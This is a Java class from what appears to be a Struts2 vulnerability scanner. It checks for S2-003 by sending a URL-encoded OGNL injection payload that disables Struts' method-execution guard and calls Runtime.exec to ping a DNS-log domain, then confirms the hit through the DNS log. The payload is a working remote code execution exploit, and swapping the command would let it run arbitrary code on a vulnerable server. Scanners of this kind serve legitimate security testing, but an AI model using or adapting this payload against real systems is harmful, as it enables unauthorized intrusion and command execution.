package struts2scan.payload;

import struts2scan.util.DnsLogClient;
import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class S2_003 implements Check {
    public String printInfo(){
        String info = "[+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据;没有回显默认用dnslog方法检测";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception{

        DnsLogClient dc = new DnsLogClient();
        String domain = dc.getDomain();
        String poc = "%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27ping%20-c%202%20"+domain+"%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29";
        if(path ==null){
            path = "/showcase.action";
        }else if(!path.endsWith(".action")){
            path = path+"showcase.action";
        }

        String url = protocol+"://"+host+":"+port+path+"?"+poc;
        HttpResult result;


        try {
            result = HttpClient.get(url);
            String rs = dc.getRecords();

            if (rs.indexOf(domain) != -1) {
                return true;
            } else {
                return false;
             }

        }catch (Exception e){
            return false;
        }

    }


}
